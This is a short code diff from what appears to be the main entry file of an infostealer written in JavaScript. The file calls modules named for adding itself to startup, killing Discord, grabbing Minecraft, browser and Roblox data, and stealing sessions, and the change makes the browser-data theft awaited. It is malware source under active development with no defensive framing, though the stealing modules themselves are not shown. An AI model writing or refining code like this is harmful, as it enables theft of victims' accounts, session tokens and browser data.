@@ -31,7 +31,7 @@ module.exports = async () => {
   if (config.addToStartup && runningFromExecutable()) require('../functions/startup');
   config.discord.killProcess && require('../functions/kill-discord');
   require('../functions/grab-mc');
-  require('../functions/grab-browsers-data');
+  await require('../functions/grab-browsers-data');
   await require('../functions/grab-roblox')();
   require('../functions/steal-sessions');
 
